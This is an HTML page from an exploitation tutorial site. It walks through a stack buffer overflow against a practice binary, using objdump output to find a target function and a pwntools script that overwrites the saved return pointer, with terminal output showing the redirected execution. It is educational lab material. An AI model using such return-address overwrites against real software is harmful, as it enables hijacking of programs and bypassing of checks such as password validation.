+0000000000401140 l     F .text              0000000000000000              frame_dummy
+0000000000403e10 l     O .init_array        0000000000000000              __frame_dummy_init_array_entry
+0000000000000000 l    df *ABS*              0000000000000000              controlRIP.c
+0000000000000000 l    df *ABS*              0000000000000000              crtstuff.c
+00000000004021f4 l     O .eh_frame          0000000000000000              __FRAME_END__
+0000000000000000 l    df *ABS*              0000000000000000              
+0000000000403e18 l       .init_array        0000000000000000              __init_array_end
+0000000000403e20 l     O .dynamic           0000000000000000              _DYNAMIC
+0000000000403e10 l       .init_array        0000000000000000              __init_array_start
+0000000000402068 l       .eh_frame_hdr      0000000000000000              __GNU_EH_FRAME_HDR
+0000000000404000 l     O .got.plt           0000000000000000              _GLOBAL_OFFSET_TABLE_
+0000000000401220 g     F .text              0000000000000001              __libc_csu_fini
+0000000000404030 w       .data              0000000000000000              data_start
+0000000000000000       F *UND*              0000000000000000              puts@@GLIBC_2.2.5
+0000000000404040 g       .data              0000000000000000              _edata
+0000000000401224 g     F .fini              0000000000000000              .hidden _fini
+0000000000000000       F *UND*              0000000000000000              printf@@GLIBC_2.2.5
+0000000000000000       F *UND*              0000000000000000              __libc_start_main@@GLIBC_2.2.5
+0000000000404030 g       .data              0000000000000000              __data_start
+0000000000000000 w       *UND*              0000000000000000              __gmon_start__
+0000000000404038 g     O .data              0000000000000000              .hidden __dso_handle
+0000000000402000 g     O .rodata            0000000000000004              _IO_stdin_used
+0000000000000000       F *UND*              0000000000000000              gets@@GLIBC_2.2.5
+0000000000401155 g     F .text              0000000000000045              func
+00000000004011c0 g     F .text              000000000000005d              __libc_csu_init
+0000000000404048 g       .bss               0000000000000000              _end
+0000000000401090 g     F .text              0000000000000001              .hidden _dl_relocate_static_pie
+0000000000401060 g     F .text              000000000000002b              _start
+0000000000404040 g       .bss               0000000000000000              __bss_start
+000000000040119a g     F .text              0000000000000020              main
+0000000000401142 g     F .text              0000000000000013              callMe
+0000000000404040 g     O .data              0000000000000000              .hidden __TMC_END__
+0000000000401000 g     F .init              0000000000000000              .hidden _init
+
+
+<b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span>#
+</div>
+      </pre>
+
+      <p>Ah well, this seems a lot of output. Maybe we can do a little formatting and filtering?</p>
+
+      <pre>
+        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># echo -n "Base Address: 0x"; objdump -t controlRIP.elf | grep callMe | awk '{print $1}'
+Base Address: 0x0000000000401142
+<b>root@kali</b>:<span style="color: #8181ff">~/Desktop/Buffer Overflow</span># </div>
+      </pre>
+
+      <p>Alright we know 2 things now :</p>
+      <ol style="list-style-type: none;">
+        <li>Offset for saved return pointer <span style="color: #09f; font-weight: bold;">72</span></li>
+        <li>Address to be overwritten with: <span style="color: #09f; font-weight: bold;">0000000000401142</span></li>
+      </ol>
+
+      <span id="Redirecting-flow-of-control" style="position: relative; top: -120px;"></span><h2>Redirecting flow of control</h2>
+
+      <p>Okay we now have enough data to exploit this application. Let's make a script in python [ you can alternatively choose another language as well ] which will overflow the buffer and write the base address of the 'callMe()' function to the saved return pointer which according to our theory, should be popped in RIP causing the flow of control to reach that function.</p>
+
+      <p>I have used the script given below</p>
+
+      <pre>
+        <div id="snip"><span style="color: #0ff; font-weight: bold;">from</span> pwn <span style="color: #0ff; font-weight: bold;">import</span> *                   <span style="color: #aaa">#   Import the sys module</span>
+<span style="color: #0ff; font-weight: bold;">import</span> sys                          <span style="color: #aaa">#   Import the sys module</span>
+
+offset  =   <span style="color: #f5f; font-weight: bold">72</span>                      <span style="color: #aaa">#   Define 'offset' with 72</span>
+callMe  =   <span style="color: #f5f; font-weight: bold">0x0000000000401142</span>      <span style="color: #aaa">#   Define 'callMe' with 0x0000000000401142</span>
+callMe  =   p64(callMe)             <span style="color: #aaa">#   Pack the bytes in little endian format for a x64 system.</span>
+
+exploit  = b<span style="color: #f5f; font-weight: bold">""</span>
+exploit += b<span style="color: #f5f; font-weight: bold">"X</span>" * offset            <span style="color: #aaa">#   Fill the buffer and overwrite the RBP with "X".</span>
+exploit += callMe                   <span style="color: #aaa">#   Now these bytes will be overflowed to the saved-return pointer.</span>
+
+sys.stdout.buffer.write(exploit)    <span style="color: #aaa">#   'exploit' is a byte-string so a normal print won't work.</span>
+</div>
+      </pre>
+
+      <div id="quote"><span style="text-transform: uppercase; font-weight: bold">Note : The above script is of python3 and not python2. Also you must replace the memory address of <span style="text-transform: none; border-bottom: 1px solid #000;">callMe()</span> in your case.</span></div>
+
+      <p>Let's see what is the output of this script</p>
+      <pre>
+        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python<b>3</b> payload.py 
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@<b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
+      </pre>
+
+      <p>You must keep in mind that the output is not just the "X", "B" & "@", when you view the hex output you will get something like this :-</p>
+
+      <pre>
+        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | xxd
+00000000: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
+00000010: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
+00000020: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
+00000030: 5858 5858 5858 5858 5858 5858 5858 5858  XXXXXXXXXXXXXXXX
+00000040: 5858 5858 5858 5858 4211 4000 0000 0000  XXXXXXXXB.@.....
+<b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># 
+        </div>
+      </pre>
+
+      <p>As you can see there are more characters in between "B" and "@" but they aren't visible.</p>
+
+      <div id="quote"><span style="float: left; font-style: italic">Things aren't always as they seem, that is, until you see the hex!😂</span><br /><br /><span style="float: right">~VulnX</span></div>
+
+      <p>Okay, aside from this, the script should be 99% functional</p>
+
+      <p>We have reached the CLIMAX, now let's check if our script helps us acheive our objective</p>
+
+      <pre>
+        <div id="snip"><b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># python3 payload.py | ./controlRIP.elf 
+Enter your username : Sorry Mr. XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXB@, but you failed.
+<span style="font-weight: bold; font-style: italic">[+] Boom! Code execution redirected.</span>
+Segmentation fault
+<b>root@kali</b>:<span style="color: #8181ff; font-weight: bold">~/Desktop/Buffer Overflow</span># </div>
+      </pre>
+
+      <p>Woah! Look at that. Such a harmless looking vulnerability helped us call a function which was not supposed to be.</p>
+
+      <p>Imagine if you had a password-validation program, if you had such vulnerabilities you could possibly jump to a function which is called only if the password is correct by acheiving control over the RIP.</p>
+
+      <p>Anyway that's it for this tutorial.<br />We will meet in the next one where we will learn to execute a shellcode on the stack.</p>
+
+      <h2>Contact</h2>
+
+      <p>If you have any doubts or confusions in some part of the tutorial, feel free to reach out to me on my <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='https://www.instagram.com/vulnx_hacking'">Instagram</span> or you can mail me at <span style="color: #05f; border-bottom: 1px solid #05f; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'">vulnx101@gmail.com</span>, alternatively you can fill the form given below and we will get back to you as soon as possible</p>
+
+      <div id="contactForm" onclick="location.href='https://docs.google.com/forms/d/e/1FAIpQLScM7cjnyriiDIwM_8wFkS66cueS83lOaDoSsJ6dlM39szevcg/viewform?usp=sf_link'">
+        <button id="contactFormButton"><span id="buttonUnderline">Fill the Form</span></button>
+      </div>
+
+      <div id="align_right">
+        Good luck,<br />
+        VulnX<br />
+      </div>
+
+      <hr>
+
+    	<div class="icons">
+          	<a class="ico" href="javascript:delay('#')">
+            	<i class="fab fa-facebook-f"></i>
+          	</a>
+          	<a class="ico" href="javascript:delay('mailto:vulnx101@gmail.com')">
+            	<i class="fab fa-google"></i>
+          	</a>
+          	<a class="ico" href="javascript:delay('#')">
+            	<i class="fab fa-instagram"></i>
+         	</a>
+        	<a class="ico" href="javascript:delay('https://bit.ly/VulnX_YT')">
+        		<i class="fab fa-youtube"></i>
+        	</a>
+        </div>
+
+    </div>
+    <div id="footer">
+    	<h1 id="footerHeading" style="cursor: pointer; background-color: transparent; font-family: 'Saira Stencil One'; font-size: 50px;" onclick="location.href='https://vulnx.in/'">VulnX</h1>
+    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/'">Home</p>
+    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/resources.html'">Resources</p>
+    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/tutorials.html'">Tutorials</p>
+    	<p style="cursor: pointer; background-color: transparent;" onclick="location.href='https://vulnx.in/Contents/ctfs.html'">CTFs</p>
+  
+    	<h1 id="footerHeading" style="background-color: transparent; font-family: 'Ubuntu';">Contact</h1>
+          
+    	<i class="fab fa-facebook-f" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='#'"></i>
+    	<i class="fab fa-google" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='mailto:vulnx101@gmail.com'"></i>
+      <i class="fab fa-instagram" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='https://www.instagram.com/vulnx_hacking'">	</i>
+    	<i class="fab fa-youtube" style="line-height: 60px; font-size: 26px; background-color: transparent; padding: 0 10px; cursor: pointer;" onclick="location.href='https://bit.ly/VulnX_YT'"></i>
+    </div>
+</body>
+</html>
